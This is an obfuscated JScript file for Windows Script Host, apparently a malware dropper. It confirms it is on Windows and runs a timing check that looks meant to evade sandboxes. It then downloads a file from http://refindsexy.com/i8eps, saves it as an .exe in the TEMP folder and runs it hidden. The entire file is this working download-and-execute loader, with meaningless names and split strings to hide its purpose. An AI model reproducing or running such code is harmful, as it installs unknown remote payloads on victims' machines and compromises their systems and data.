var l0 = false;
var yf = "CreateObject";
var s = function I() {return WScript[yf]("WScript.Shell");}(), V = 11;
var C = "MSXML2.XMLHTTP";
var X = 2123213;
var Jx = 0;
function vS(dU){s["Run"](dU, Jx, Jx);};
function O(){return "" + C;};
function H(ey, qX){Jx = Jx * 1; return ey - qX;};
function Pt(){return yf;};
/*@cc_on
  @if (@_win32 || @_win64)
    l0 = true;
  @end
@*/
if (l0)
{
var KN = "";
function o(){return 22;};
var h = 0; var YG = 0;
function iy()
{
var Dg = new this["Date"]();
var t = Dg["getUTCMilliseconds"]();
WScript["Sleep"](o());
var Dg = new this["Date"]();
var ev = Dg["getUTCMilliseconds"]();
WScript["Sleep"](o());
var Dg = new this["Date"]();
var zd = Dg["getUTCMilliseconds"]();
var h = "G";
h = H(ev, t);
var YG = "Li";
YG = H(zd, ev);
KN = "open";
return H(h, YG);
}
var l = false;
var u = false;
for (var hb = Jx; hb < o() * 1; hb++){if (iy() != Jx){
l = true; 
YG = "31" + 11 * h + YG; 
u = true; 
break;
}}
function c() {return ((l == true) && (l == u)) ? 1 : Jx;};
if (l && c() && u){
function F() {return s["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "aLW0uD0fl.exe";};
 kF = O();
 ZF = WScript[yf](kF);
 var UX = 1;
 while (UX){
try {
ZF[KN]("GET", "http://refindsexy.com/i8eps", false);
ZF["send"]();
q = "Sleep";
for (;;){WScript[q](o() * 11); if (ZF["readystate"] >= 2 * 2) break;};
UX = Jx;
} catch(OS){};
}
function Yl(T) {var dk = (1, 2, 3, 4, 5, T); return dk;};
A = WScript[Pt()]("ADODB.Stream");
kF = A;
kF[KN]();
kF["type"] = Yl(1);
kF["write"](ZF["ResponseBody"]);
A["position"] = Yl(Jx);
kF["Save" + "ToFile"](F(), 2);
A["c"+"lose"]();
D = F();
vS(D);
}
}

